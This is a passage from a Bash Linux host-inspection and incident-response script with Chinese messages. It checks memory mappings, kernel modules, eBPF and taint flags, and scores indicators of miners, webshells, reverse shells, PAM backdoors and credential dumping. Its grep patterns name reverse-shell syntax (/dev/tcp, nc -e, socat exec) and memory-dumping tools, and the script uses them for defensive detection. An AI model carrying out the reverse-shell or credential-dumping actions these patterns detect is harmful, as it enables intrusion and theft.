                    php_runtime_owner_cache["$clean_file"]="${owner:-__UNOWNED__}"
                fi
            fi
            printf 'mapping\tprocess:%s:%s:%s:%s\tloaded_object\t%s sha256=%s\t%s\t%s\n' \
                "$boot_id" "$pid" "$start" "$exe" "$file" "$hash" "${owner:-unowned}" \
                "$([[ "$mapping" == *'(deleted)'* || "$file" == /tmp/* || "$file" == /var/tmp/* || "$file" == /dev/shm/* ]] && printf ANOMALY || printf OBSERVED)" >> "$out"
        done < <(grep -E '[.]so([.0-9]*)?([[:space:]]|$)|[(]deleted[)]' "${proc_root}/${pid}/maps" 2>/dev/null | head -100)
    done
    printf 'visibility\topcache\tinspection\tdisabled\tn/a\tNo public or unauthenticated OPcache page is created; protected local helper must be explicitly configured\n' >> "$out"
    record_raw_status 'php-runtime.tsv' SUCCESS runtime ''
}

collect_native_memory_mappings() {
    local out="${RAW_DIR}/native-executable-mappings.tsv" status pid start comm exe instance line address perms path rss vmflags map_target counter network smaps_gaps=0
    printf 'process_instance_id\tpid\tcomm\texe\taddress\tpermissions\tpath\tmapping_kind\trss_kb\tvmflags\tmap_files_target\tcounter_evidence\tnetwork\n' > "$out"
    if [ "$NATIVE_RUNTIME_READY" = true ] && [ "$NATIVE_RUNTIME_FINAL_STATUS" = NOT_RUN ]; then
        if native_runtime_run final "${RAW_DIR}/runtime-snapshot-final.jsonl" "" "" "$out"; then
            native_runtime_record_status final "$NATIVE_RUNTIME_LAST_STATUS" memory "collector_status=${NATIVE_RUNTIME_LAST_STATUS}"
            if [ "$NATIVE_RUNTIME_LAST_STATUS" = PARTIAL ]; then mark_current_module_partial native_runtime_final_partial; fi
            record_raw_status 'native-executable-mappings.tsv' "$NATIVE_RUNTIME_LAST_STATUS" memory "native_runtime=${NATIVE_RUNTIME_LAST_STATUS}"
            return 0
        fi
        native_runtime_record_status final PARTIAL memory "native_runtime_exit_or_output_invalid=${NATIVE_RUNTIME_LAST_STATUS}"
        mark_current_module_partial native_runtime_final_failed
    fi
    for status in /proc/[0-9]*/status; do
        [ -r "$status" ] || continue; pid="${status#/proc/}"; pid="${pid%/status}"
        start=$(awk '{print $22}' "/proc/${pid}/stat" 2>/dev/null); [ -n "$start" ] || continue
        [ -r "/proc/${pid}/smaps" ] || { smaps_gaps=$((smaps_gaps + 1)); continue; }
        comm=$(cat "/proc/${pid}/comm" 2>/dev/null || true); exe=$(readlink "/proc/${pid}/exe" 2>/dev/null || true)
        instance="process:$(cat /proc/sys/kernel/random/boot_id 2>/dev/null || echo unknown):${pid}:${start}:${exe}"
        counter="none"; case "$comm" in java|node|dotnet|postgres|mysqld|mongod|redis-server|php-fpm*) counter="known_jit_or_runtime" ;; esac
        network=$(socket_snapshot established | grep -E "pid=${pid}," | head -3 | tr '\n' ';')
        while IFS=$'\t' read -r address perms path rss vmflags; do
            [ -n "$address" ] || continue; map_target=$(readlink "/proc/${pid}/map_files/${address}" 2>/dev/null || true)
            [ -n "$map_target" ] || map_target=UNAVAILABLE_OR_ANONYMOUS
            printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' "$instance" "$pid" "$comm" "$exe" "$address" "$perms" "$path" \
                "$([[ "$path" == *memfd:* ]] && printf MEMFD || { [[ "$path" == *'(deleted)'* ]] && printf DELETED || { [ -z "$path" ] && printf ANONYMOUS_EXECUTABLE || printf EXECUTABLE_MAPPING; }; })" \
                "$rss" "$vmflags" "$map_target" "$counter" "$network" >> "$out"
        done < <(awk '
            function emit(  suspicious) {
                suspicious=(path ~ /memfd:/ || path ~ /\(deleted\)/ || path == "" || perms ~ /w.x/)
                if (address != "" && perms ~ /x/ && suspicious) print address "\t" perms "\t" path "\t" rss "\t" flags
            }
            /^[0-9a-f]+-[0-9a-f]+[[:space:]]/ {
                emit(); address=$1; perms=$2; path=""; for(i=6;i<=NF;i++) path=path (path==""?"":" ") $i; rss=""; flags=""; next
            }
            $1=="Rss:" {rss=$2; next}
            $1=="VmFlags:" {$1=""; sub(/^ /,""); flags=$0; next}
            END {emit()}
        ' "/proc/${pid}/smaps" 2>/dev/null | head -80)
    done
    if [ "$smaps_gaps" -gt 0 ]; then
        record_raw_status 'native-executable-mappings.tsv' PARTIAL memory "smaps_unreadable_processes=${smaps_gaps}"; mark_current_module_partial "smaps_unreadable_processes=${smaps_gaps}"
    else
        record_raw_status 'native-executable-mappings.tsv' "$([ "$(wc -l < "$out")" -gt 1 ] && printf SUCCESS || printf NO_RESULTS)" memory ''
    fi
}

collect_ebpf_kernel_inventory() {
    local status=SUCCESS sub command_name path module_path
    mkdir -p "${RAW_DIR}/kernel"; chmod 700 "${RAW_DIR}/kernel"
    if command -v bpftool >/dev/null 2>&1; then
        for sub in prog map link; do run_with_timeout 12 bpftool "$sub" show > "${RAW_DIR}/kernel/bpf-${sub}.txt" 2>&1 || status=PARTIAL; chmod 600 "${RAW_DIR}/kernel/bpf-${sub}.txt"; done
        find /sys/fs/bpf -xdev -maxdepth 6 -printf '%y\t%p\n' 2>/dev/null > "${RAW_DIR}/kernel/bpf-pinned.txt" || status=PARTIAL
        record_raw_status 'kernel/bpf-prog.txt' "$status" kernel ''; record_raw_status 'kernel/bpf-map.txt' "$status" kernel ''; record_raw_status 'kernel/bpf-link.txt' "$status" kernel ''
    else
        printf 'UNAVAILABLE: bpftool is not installed\n' > "${RAW_DIR}/kernel/bpf-unavailable.txt"
        record_raw_status 'kernel/bpf-unavailable.txt' UNAVAILABLE kernel 'bpftool missing; user-space scan cannot exclude a kernel rootkit'
        mark_current_module_partial bpftool_unavailable
    fi
    { cat /sys/kernel/debug/tracing/enabled_functions 2>/dev/null; cat /sys/kernel/tracing/enabled_functions 2>/dev/null; } | head -5000 > "${RAW_DIR}/kernel/ftrace-enabled-functions.txt"
    printf 'module\tpath\tsha256\tpackage_owner\tsigner\tsig_id\n' > "${RAW_DIR}/kernel/modules-integrity.tsv"
    while read -r command_name _; do
        [ -n "$command_name" ] || continue; module_path=$(modinfo -n "$command_name" 2>/dev/null || true)
        printf '%s\t%s\t%s\t%s\t%s\t%s\n' "$command_name" "$module_path" "$( [ -f "$module_path" ] && sha256_file "$module_path" 2>/dev/null || true)" \
            "$(file_package_owner "$module_path")" "$(modinfo -F signer "$command_name" 2>/dev/null)" "$(modinfo -F sig_id "$command_name" 2>/dev/null)" >> "${RAW_DIR}/kernel/modules-integrity.tsv"
    done < /proc/modules
    chmod 600 "${RAW_DIR}/kernel/"* 2>/dev/null || true
    record_raw_status 'kernel/ftrace-enabled-functions.txt' "$([ -s "${RAW_DIR}/kernel/ftrace-enabled-functions.txt" ] && printf SUCCESS || printf NO_RESULTS)" kernel ''
    record_raw_status 'kernel/modules-integrity.tsv' SUCCESS kernel ''
}

check_memory() {
    echo ""
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BOLD}${MAGENTA}  [11/12] 内存信息 (轻量)${NC}"
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

    echo -e "  ${DIM}注: 完整内存取证需 avml/LiME 等专用工具。此模块仅做轻量检查。${NC}"
    collect_jvm_runtime_inventory
    collect_php_runtime_inventory
    collect_native_memory_mappings

    # /proc/sys/kernel/tainted
    local taint=$(cat /proc/sys/kernel/tainted 2>/dev/null)
    if [ -n "$taint" ] && [ "$taint" != "0" ]; then
        emit_find "OBSERVE" "内核 Tainted 标记非零: $taint" \
            "含义: $(decode_taint $taint)" \
            "核对驱动、崩溃和模块加载记录；该标记本身不是 rootkit 证据"
        record_find "OBSERVE" "kernel" "Kernel tainted" "值=${taint}; 含义=$(decode_taint $taint)" "检查模块签名、路径和包归属" "" \
            "INT-KERNEL-TAINT" "kernel-taint" "dmesg_tail.txt,kernel_tainted.txt,lsmod.txt,proc_modules.txt" \
            "SECURITY_ANOMALY" "LOW" '专有驱动、崩溃或强制卸载等正常运维场景也会设置 taint 标记' \
            '若同时发现未知模块、隐藏进程、内核符号篡改或无包归属模块，应升级处置'
    else
        log_info "内核 Tainted: $taint (正常)"
    fi

    # 列出 /proc/*/maps 中从临时目录加载的库
    echo -e "\n  ${BOLD}进程内存映射异常 (临时目录 .so):${NC}"
    if { [ "$NATIVE_RUNTIME_FINAL_STATUS" = SUCCESS ] || [ "$NATIVE_RUNTIME_FINAL_STATUS" = PARTIAL ]; } && [ -s "${RAW_DIR}/native-executable-mappings.tsv" ]; then
        while IFS=$'\t' read -r instance pid comm exe address perms path mapping_kind rss vmflags map_target counter_evidence network; do
            [[ "$path" == /tmp/*.so* || "$path" == /dev/shm/*.so* || "$path" == /var/tmp/*.so* ]] || continue
            local pid_dir="/proc/${pid}" inject="${address} ${perms} ${path}" cmdline inject_path inject_mode="" inject_owner="" inject_euid="" inject_network="$network"
            local inject_type="SECURITY_ANOMALY" inject_confidence="MEDIUM" inject_reason="进程实际映射了临时目录共享库"
            cmdline=$(tr '\0' ' ' < "${pid_dir}/cmdline" 2>/dev/null | head -c 100)
            inject_path="${path% (deleted)}"
            inject_mode=$(stat -c '%a' -- "$inject_path" 2>/dev/null || true)
            inject_owner=$(stat -c '%U:%G' -- "$inject_path" 2>/dev/null || true)
            inject_euid=$(awk '/^Uid:/ {print $3; exit}' "${pid_dir}/status" 2>/dev/null)
            if [ -n "$inject_network" ] || { [ "$inject_euid" = "0" ] && [[ "$inject_mode" =~ [2367][0-9]$ || "$inject_mode" =~ [0-9][2367]$ ]]; }; then
                inject_type="SECURITY_THREAT"; inject_confidence="HIGH"
                inject_reason="临时目录共享库已加载，并关联网络连接或特权进程加载可写库"
            fi
            local inject_detail="PID=${pid}; euid=${inject_euid:-unknown}; cmd=${cmdline}; lib=${inject_path}; owner=${inject_owner:-unknown}; mode=${inject_mode:-unknown}; network=${inject_network:-none}; maps=${inject}; mapping_kind=${mapping_kind}; rss_kb=${rss}; vmflags=${vmflags}; map_files_target=${map_target}; counter=${counter_evidence}"
            emit_find "HIGH" "PID $pid 映射了临时目录共享库" \
                "$inject_detail" \
                "核对库来源、权限、加载方式和进程网络；出现行为关联时按注入处置"
            record_find "HIGH" "injection" "临时目录共享库映射 PID $pid" "$inject_detail" "提取进程与库文件分析" "T1055.001" \
                "MEM-TEMP-SHARED-LIB" "$inject_path" "native-executable-mappings.tsv,ss_established.txt,module-memory.log" "$inject_type" "$inject_confidence" \
                "$inject_reason；部分应用会从临时目录解压并加载合法库" \
                '若特权进程加载可写库、存在异常外连、库无可信来源或命中恶意哈希，应升级处置'
            [ "$inject_type" != "SECURITY_THREAT" ] || add_ioc "Memory" "PID $pid: $inject_path" "$inject_reason"
        done < <(tail -n +2 "${RAW_DIR}/native-executable-mappings.tsv")
    else
        for pid_dir in /proc/[0-9]*; do
            local pid=$(basename "$pid_dir")
            local inject=$(grep -E '/tmp/.*\.so|/dev/shm/.*\.so|/var/tmp/.*\.so' "${pid_dir}/maps" 2>/dev/null | head -3)
            if [ -n "$inject" ]; then
                local cmdline=$(tr '\0' ' ' < "${pid_dir}/cmdline" 2>/dev/null | head -c 100)
                local inject_path inject_mode="" inject_owner="" inject_euid="" inject_network=""
                local inject_type="SECURITY_ANOMALY" inject_confidence="MEDIUM" inject_reason="进程实际映射了临时目录共享库"
                inject_path=$(printf '%s\n' "$inject" | awk '{print $NF}' | head -1)
                inject_mode=$(stat -c '%a' -- "$inject_path" 2>/dev/null || true)
                inject_owner=$(stat -c '%U:%G' -- "$inject_path" 2>/dev/null || true)
                inject_euid=$(awk '/^Uid:/ {print $3; exit}' "${pid_dir}/status" 2>/dev/null)
                inject_network=$(socket_snapshot established | grep -E "pid=${pid}," | head -3)
                if [ -n "$inject_network" ] || { [ "$inject_euid" = "0" ] && [[ "$inject_mode" =~ [2367][0-9]$ || "$inject_mode" =~ [0-9][2367]$ ]]; }; then
                    inject_type="SECURITY_THREAT"; inject_confidence="HIGH"
                    inject_reason="临时目录共享库已加载，并关联网络连接或特权进程加载可写库"
                fi
                local inject_detail="PID=${pid}; euid=${inject_euid:-unknown}; cmd=${cmdline}; lib=${inject_path}; owner=${inject_owner:-unknown}; mode=${inject_mode:-unknown}; network=${inject_network:-none}; maps=${inject}"
                emit_find "HIGH" "PID $pid 映射了临时目录共享库" \
                    "$inject_detail" \
                    "核对库来源、权限、加载方式和进程网络；出现行为关联时按注入处置"
                record_find "HIGH" "injection" "临时目录共享库映射 PID $pid" "$inject_detail" "提取进程与库文件分析" "T1055.001" \
                    "MEM-TEMP-SHARED-LIB" "$inject_path" "proc/,ss_established.txt,module-memory.log" "$inject_type" "$inject_confidence" \
                    "$inject_reason；部分应用会从临时目录解压并加载合法库" \
                    '若特权进程加载可写库、存在异常外连、库无可信来源或命中恶意哈希，应升级处置'
                [ "$inject_type" != "SECURITY_THREAT" ] || add_ioc "Memory" "PID $pid: $inject_path" "$inject_reason"
            fi
        done
    fi

    # 系统内存使用
    echo -e "\n  ${BOLD}内存概况:${NC}"
    free -h 2>/dev/null | while read line; do echo "    $line"; done

    # /proc/meminfo 关键字段
    echo -e "\n  ${BOLD}/proc/meminfo 关键字段:${NC}"
    grep -E '^(MemTotal|MemFree|MemAvailable|SwapTotal|SwapFree|Slab|KernelStack|PageTables)' /proc/meminfo 2>/dev/null | while read line; do echo "    $line"; done
}

# 解析 kernel taint 值
decode_taint() {
    local t="$1"
    [ -z "$t" ] && echo "unknown" && return
    local flags=()
    [ $((t & 1)) -ne 0 ]   && flags+=("P: proprietary module loaded")
    [ $((t & 2)) -ne 0 ]   && flags+=("F: module force-loaded")
    [ $((t & 4)) -ne 0 ]   && flags+=("S: SMP with non-SMP module")
    [ $((t & 8)) -ne 0 ]   && flags+=("R: module force-unloaded")
    [ $((t & 16)) -ne 0 ]  && flags+=("M: machine check exception")
    [ $((t & 32)) -ne 0 ]  && flags+=("B: bad page state")
    [ $((t & 64)) -ne 0 ]  && flags+=("U: user")
    [ $((t & 128)) -ne 0 ] && flags+=("D: kernel OOPS/BUG")
    [ $((t & 256)) -ne 0 ] && flags+=("A: ACPI table overridden")
    [ $((t & 512)) -ne 0 ] && flags+=("W: warning issued")
    [ $((t & 1024)) -ne 0 ] && flags+=("C: staging driver loaded")
    [ $((t & 2048)) -ne 0 ] && flags+=("I: workaround for bug applied")
    [ $((t & 4096)) -ne 0 ] && flags+=("O: out-of-tree module loaded")
    [ $((t & 8192)) -ne 0 ] && flags+=("E: unsigned module loaded")
    [ $((t & 16384)) -ne 0 ] && flags+=("L: soft lockup")
    [ $((t & 32768)) -ne 0 ] && flags+=("K: kernel live patch")
    echo "${flags[*]}" | tr ' ' ';'
}

#==============================================================================
# 已停用的旧版攻击模式实现（不再注册为巡检模块）
#==============================================================================

check_patterns() {
    echo ""
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BOLD}${MAGENTA}  [DISABLED] 攻击模式匹配（跨模块关联）${NC}"
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

    # ---- 挖矿 ⛏️ ----
    # 评分阈值参考: CRITICAL≥7, HIGH≥5, MEDIUM≥3
    local miner_score=0
    local miner_direct=0
    local miner_detail=""
    # 高 CPU 进程 (排除白名单路径)
    local high_cpu_procs=$(ps aux --sort=-%cpu 2>/dev/null | awk 'NR>1 && $3>80 {print $2":"$3"%:"$11}' | head -5)
    local cpu_score=0
    if [ -n "$high_cpu_procs" ]; then
        while IFS= read -r line; do
            [ -z "$line" ] && continue
            local pid=$(echo "$line" | cut -d: -f1)
            local exe=$(readlink "/proc/${pid}/exe" 2>/dev/null)
            local pname=$(echo "$line" | cut -d: -f3)
            if is_whitelisted_path "$exe" || is_whitelisted "$pname"; then
                miner_score=$((miner_score + 0))  # 白名单，不加分
            else
                cpu_score=$((cpu_score + 1))
            fi
        done <<< "$high_cpu_procs"
    fi
    [ "$cpu_score" -gt 0 ] && miner_score=$((miner_score + 2)) && miner_detail="高CPU(非白名单):${cpu_score}个"

    # 临时目录进程 (仅统计非白名单进程)
    local tmp_proc_count=$(ps aux 2>/dev/null | grep -E '/tmp/|/dev/shm/' | grep -v grep | grep -vE 'npm|node_modules|pip|python.*cache' | awk '{print $11}' | while read p; do
        is_whitelisted "$(basename "$p")" || echo "$p"
    done | head -10 | wc -l)
    [ "$tmp_proc_count" -gt 0 ] && miner_score=$((miner_score + 1)) && miner_detail="${miner_detail};临时目录进程:${tmp_proc_count}个"

    # 矿池端口
    local pool_hit=$(socket_snapshot established | awk '$6 ~ /:(14444|3333|4444|5555|7777|8088|9999)$/' | head -3)
    [ -n "$pool_hit" ] && miner_score=$((miner_score + 3)) && miner_detail="${miner_detail};矿池端口"

    # 挖矿进程名 (排除安全测试/训练环境下的已知工具路径)
    # stratum 矿池协议特征: stratum+tcp:// 或 stratum+ssl:// 出现在命令行
    local miner_proc_hits=$(ps aux 2>/dev/null | grep -iE 'xmrig|minergate|cpuminer|minerd|stratum\+tcp|stratum\+ssl|cryptonight' | grep -v grep)
    if [ -n "$miner_proc_hits" ]; then
        # 排除安全测试/训练环境路径
        local real_hits=$(echo "$miner_proc_hits" | grep -viE '实训|lab|tools|training')
        if [ -n "$real_hits" ]; then
            miner_direct=1
            miner_score=$((miner_score + 3))
            # 提取实际进程名和命令行
            local miner_names=$(echo "$real_hits" | awk '{print $11}' | sort -u | head -5 | tr '\n' ',' | sed 's/,$//')
            miner_detail="${miner_detail};矿池/挖矿进程: ${miner_names}"
        fi
    fi

    # 可疑 cron 守护 (curl/wget 下载脚本)
    local cron_hit=$(grep -rE 'curl.*\.sh|wget.*\.sh' /var/spool/cron/ 2>/dev/null | head -3)
    [ -n "$cron_hit" ] && miner_score=$((miner_score + 1)) && miner_detail="${miner_detail};可疑cron"

    if [ "$miner_direct" -eq 1 ] && [ "$miner_score" -ge 9 ]; then
        emit_find "CRITICAL" "⛏️  高度疑似挖矿木马 (得分: ${miner_score})" \
            "${miner_detail}" \
            "1. 记录 PID 和矿池 IP  2. 暂停进程(SIGSTOP)取证  3. 清理 crontab  4. 删除恶意文件"
        record_find "CRITICAL" "miner" "挖矿木马" "${miner_detail}" "按步骤处置" "T1496" \
            "MIN-CORRELATED-ACTIVITY" "miner-correlated" "ps_auxww.txt,ss_established.txt,crontab_all.txt" \
            "SECURITY_THREAT" "HIGH"
        add_ioc "Pattern" "⛏️ Miner" "${miner_detail}"
    elif [ "$miner_direct" -eq 1 ] && [ "$miner_score" -ge 5 ]; then
        emit_find "HIGH" "⛏️  挖矿风险较高 (得分: ${miner_score})" \
            "${miner_detail}" \
            "深入检查进程行为、网络连接和计划任务"
        record_find "HIGH" "miner" "挖矿高危" "${miner_detail}" "深入检查" "T1496" \
            "MIN-CORRELATED-ACTIVITY" "miner-correlated" "ps_auxww.txt,ss_established.txt,crontab_all.txt" \
            "SECURITY_THREAT" "HIGH" '挖矿进程或 stratum 特征与高 CPU、矿池端口、临时目录或计划任务形成关联' \
            '确认进程文件哈希和连接目标后隔离处置'
        add_ioc "Pattern" "⛏️ Miner" "${miner_detail}"
    elif [ "$miner_direct" -eq 1 ]; then
        emit_find "HIGH" "命中挖矿进程或 stratum 特征 (得分: ${miner_score})" \
            "${miner_detail}" \
            "核对进程文件、启动来源和网络；单一名称或命令行仍需确认"
        record_find "HIGH" "miner" "挖矿进程特征" "${miner_detail}" "核对进程和启动来源" "T1496" \
            "MIN-PROCESS-SIGNATURE" "miner-process-signature" "ps_auxww.txt,proc/,ss_established.txt" \
            "SECURITY_ANOMALY" "MEDIUM" '进程名或命令行命中高风险挖矿特征，但尚未与资源、网络或持久化行为关联' \
            '若同时出现高 CPU、矿池连接、临时目录执行或持久化，应升级为安全威胁'
    elif [ "$miner_score" -ge 5 ]; then
        emit_find "MEDIUM" "存在低可信度挖矿相关指标 (得分: ${miner_score})" \
            "${miner_detail}" \
            "未发现挖矿进程或 stratum 特征，先核对业务负载和连接用途"
        record_find "MEDIUM" "miner" "挖矿低可信度指标" "${miner_detail}" "核对业务负载和连接用途" "T1496" \
            "MIN-WEAK-SIGNALS" "miner-weak-signals" "ps_auxww.txt,ss_established.txt,crontab_all.txt" \
            "SECURITY_ANOMALY" "LOW" '高 CPU、临时目录和常见端口都可能来自正常业务，且未命中挖矿进程或协议特征' \
            '若后续发现挖矿进程、stratum、恶意哈希或持久化，应升级处置'
    else
        log_info "挖矿检测: 未命中 (得分: ${miner_score})"
    fi

    # ---- WebShell：HTTP -> 文件 -> 进程 -> 网络 -> 持久化 ----
    correlate_web_attack_chain
    correlate_advanced_behaviors
    run_rat_detection_engine
    # 以下旧版简单分数模型保留在源码中仅用于版本比对，不再执行。
    if false; then
    local ws_score=0
    local recent_php=$(find /var/www /usr/share/nginx /usr/local/nginx /opt/www /home -name '*.php' -mtime -7 -type f -print -quit 2>/dev/null)
    [ -n "$recent_php" ] && ws_score=$((ws_score + 2))
    local web_child_hit=$(web_shell_children | head -1)
    [ -n "$web_child_hit" ] && ws_score=$((ws_score + 4))
    local web_keyword_hit=$(find /var/www /usr/share/nginx -name '*.php' -exec grep -lE 'eval\(|base64_decode|shell_exec|system\(' {} \; 2>/dev/null | head -1)
    [ -n "$web_keyword_hit" ] && ws_score=$((ws_score + 1))
    if [ "$ws_score" -ge 4 ]; then
        local ws_evidence="近日PHP=${recent_php:-无}; Web子进程=${web_child_hit:-无}; 关键字文件=${web_keyword_hit:-无}"
        emit_find "CRITICAL" "🐚 Web 服务进程派生 Shell (关联得分: ${ws_score}/7)" \
            "$ws_evidence" \
            "1. 检查 Web 日志攻击路径  2. 定位具体恶意文件  3. 检查数据库是否被篡改"
        record_find "CRITICAL" "webshell" "Web 进程派生 Shell" "$ws_evidence" "检查 Web 日志+恶意文件" "T1505.003" \
            "WEB-PROCESS-SHELL" "web-shell-lineage" "ps_auxww.txt,proc/,ss_established.txt,file-changes.tsv" \
            "SECURITY_THREAT" "HIGH" 'Web 服务祖先进程派生 Shell 或解释器，并已与近期文件或静态线索交叉关联' \
            '立即结合访问日志、落地文件、外连和账号行为确定入口及影响范围'
        add_ioc "Pattern" "🐚 Webshell" "得分: ${ws_score}"
    elif [ "$ws_score" -ge 2 ]; then
        emit_find "MEDIUM" "Web 目录存在低可信度异常 (得分: ${ws_score}/7)" \
            "近日PHP=${recent_php:-无}; 关键字文件=${web_keyword_hit:-无}" \
            "单一静态特征不足以判定 Webshell，请结合版本发布记录和 Web 日志确认"
        record_find "MEDIUM" "webshell" "Web 目录低可信度静态异常" \
            "近日PHP=${recent_php:-无}; 关键字文件=${web_keyword_hit:-无}; 得分=${ws_score}/7" \
            "结合发布和访问日志确认" "T1505.003" "WEB-STATIC-ANOMALY" "web-static-anomaly" \
            "file-inventory-current.tsv,module-filesystem.log" "SECURITY_ANOMALY" "LOW" \
            '近期脚本和 eval/system 等关键字在正常应用中普遍存在，不能单独证明 WebShell' \
            '若出现 Web 服务派生 Shell、异常请求命中、文件执行或外连，应升级处置'
    else
        log_info "Webshell 检测: 未命中 (得分: ${ws_score})"
    fi

    fi

    # ---- 反弹 Shell 🔄 ----
    local rev_score=0
    local rev_proc=$(ps aux 2>/dev/null | grep -E '/dev/tcp/|nc -e.*(/bin/|/sh|cmd|powershell)|python.*socket.*connect|socat.*exec:|bash -i.*>&.*tcp' | grep -v grep | head -5)
    [ -n "$rev_proc" ] && rev_score=$((rev_score + 3))
    local rev_port=""
    for port in 4444 5555 7777 8888 31337; do
        local found=$(socket_snapshot listen_tcp | grep -E ":${port}[[:space:]]")
        if [ -n "$found" ]; then
            rev_port="${port} ($(echo "$found" | awk '{print $NF}' | head -1))"
            break
        fi
    done
    if [ "$rev_score" -ge 3 ]; then
        emit_find "HIGH" "🔄 进程命中反弹 Shell 特征 (得分: ${rev_score}/5)" \
            "$rev_proc" \
            "核对命令行、父进程和网络连接；确认后隔离"
        record_find "HIGH" "reverseshell" "反弹 Shell 命令行特征" "$rev_proc" "核对进程与网络证据" "T1059" \
            "REV-PROCESS-CMDLINE" "reverse-shell-cmdline" "ps_auxww.txt,ss_established.txt,proc/" \
            "SECURITY_ANOMALY" "MEDIUM" '命令行命中反弹 Shell 高风险语法，但尚未证明标准输入输出连接网络 Socket' \
            '若 Socket 标准输入输出规则命中，或与 Web 祖先进程、异常外连关联，应升级为确认威胁'
    elif [ -n "$rev_port" ]; then
        log_info "反弹 Shell 检测: 仅命中敏感监听端口，未形成 Finding (${rev_port})"
    else
        log_info "反弹 Shell 检测: 未命中 (得分: ${rev_score})"
    fi

    # LD_PRELOAD 已在进程和 Rootkit 模块按具体库的路径、权限、包归属与实际加载
    # 情况完成分级。这里不再按“配置非空”重复生成 CRITICAL。
    log_info "LD_PRELOAD 攻击链由进程与 Rootkit 模块的结构化规则负责"

    # ---- PAM 后门 🔐 ----
    local pam_score=0
    local pam_permit_hit=$(grep -v '^#' /etc/pam.d/sshd 2>/dev/null | grep -E 'auth.*sufficient.*pam_permit' | head -1)
    [ -n "$pam_permit_hit" ] && pam_score=$((pam_score + 5))
    if [ "$pam_score" -ge 3 ]; then
        emit_find "HIGH" "PAM SSH 认证链启用了 pam_permit sufficient" \
            "$pam_permit_hit" \
            "核实变更来源和 PAM 执行顺序；未经授权时立即恢复可信配置"
        record_find "HIGH" "authentication" "PAM SSH 认证链异常" "$pam_permit_hit" \
            "核实并恢复可信 PAM 配置" "T1556.003" "AUTH-PAM-PERMIT-SUFFICIENT" "/etc/pam.d/sshd" \
            "module-patterns.log,file-changes.tsv" "SECURITY_ANOMALY" "HIGH" \
            'pam_permit 以 sufficient 参与 SSH 认证可能导致认证绕过，但仅凭当前配置无法判断是恶意植入还是错误配置' \
            '若该文件近期被陌生进程修改，或已出现无正常凭据的成功登录，应升级为确认威胁'
    else
        log_info "PAM 后门检测: 未命中 (得分: ${pam_score})"
    fi

    # ---- 凭证窃取 💰 ----
    local cred_score=0
    local cred_direct=0
    local cred_evd=""
    # Linux 上更常见的是针对进程内存的 gcore/gdb/procdump/dd /proc/PID/mem；
    # 工具命中本身仍需与输出文件、目标进程和执行来源关联。
    local cred_tool_hit=$(ps -eo pid=,ppid=,user=,args= 2>/dev/null | \
        grep -iE 'mimikatz|(^|[[:space:]])gcore([[:space:]]|$)|gdb.*(-p|--pid)[[:space:]]*[0-9]+|procdump|dd.*(/proc/[0-9]+/mem)' | \
        grep -vE 'grep -iE|secscope' | head -3)
    if [ -n "$cred_tool_hit" ]; then
        cred_direct=1
        cred_score=$((cred_score + 3))
        cred_evd="凭证/内存访问工具进程: $(echo "$cred_tool_hit" | tr '\n' '; ')"
    fi
    # .dmp 在临时目录，且是最近 1 天创建（非陈旧遗留文件）
    local recent_dmp=$(find /tmp /dev/shm /var/tmp -name '*.dmp' -type f -mtime -1 2>/dev/null | head -3)
    if [ -n "$recent_dmp" ]; then
        cred_score=$((cred_score + 2))
        cred_evd="${cred_evd}; 临时目录近日.dmp: $(echo "$recent_dmp" | tr '\n' ',' | sed 's/,$//')"
    fi
    if [ "$cred_direct" -eq 1 ] && [ "$cred_score" -ge 5 ]; then
        emit_find "HIGH" "💰 疑似凭证窃取活动 (得分: ${cred_score})" \
            "${cred_evd}" \
            "确认工具目标、输出转储和执行账号；未授权时隔离并轮换相关凭据"
        record_find "HIGH" "credential" "凭证访问工具与转储关联" "${cred_evd}" "核验目标并轮换相关凭据" "T1003" \
            "CRD-MEMORY-DUMP-CORRELATED" "credential-memory-dump" "ps_auxww.txt,tmp_executables.txt,audit_auth_exec_events.txt" \
            "SECURITY_THREAT" "HIGH" '凭证或内存访问工具进程与近期临时转储文件同时出现，形成行为关联' \
            '确认目标进程和转储内容范围，保存证据后处置'
        add_ioc "Pattern" "CredentialDump" "${cred_evd}"
    elif [ "$cred_direct" -eq 1 ]; then
        emit_find "HIGH" "命中凭证或进程内存访问工具特征 (得分: ${cred_score})" \
            "${cred_evd}" \
            "确认是否为授权调试、应急响应或红队活动"
        record_find "HIGH" "credential" "凭证访问工具特征" "${cred_evd}" "核验执行目的和目标进程" "T1003" \
            "CRD-MEMORY-ACCESS-TOOL" "credential-memory-tool" "ps_auxww.txt,audit_auth_exec_events.txt" \
            "SECURITY_ANOMALY" "MEDIUM" 'gdb/gcore/procdump 等也可用于合法调试，单一工具进程不能证明凭证窃取' \
            '若出现敏感进程转储、异常账号执行或转储文件外传，应升级为安全威胁'
    elif [ "$cred_score" -ge 2 ]; then
        emit_find "MEDIUM" "💰 凭证窃取低可信度 (得分: ${cred_score})" \
            "${cred_evd}" \
            "仅部分指标命中，人工确认"
        record_find "MEDIUM" "credential" "近期临时转储文件" "${cred_evd}" "核对文件创建进程和内容" "T1003" \
            "CRD-RECENT-DUMP" "recent-temp-dump" "tmp_executables.txt,audit_auth_exec_events.txt" \
            "SECURITY_ANOMALY" "LOW" '临时目录中的 .dmp 可能来自应用崩溃或正常诊断，不能单独证明凭证窃取' \
            '若关联敏感进程内存访问、异常账号或外传行为，应升级处置'
    else
        log_info "凭证窃取检测: 未命中 (得分: ${cred_score})"
    fi

    # ---- SSH 爆破 + 后门账户 链条 ----
    [ -n "$AUTH_EVENTS" ] || AUTH_EVENTS=$(read_auth_events)
    if [ -n "$AUTH_EVENTS" ]; then
        # 只有同一来源 IP 在累计大量失败后又成功登录，才构成攻击链；不再关联无关登录。
        local brute_success=$(printf '%s\n' "$AUTH_EVENTS" | awk '
            /Failed password/ { failed[$(NF-3)]++; next }
            /Accepted/ {
                ip=""
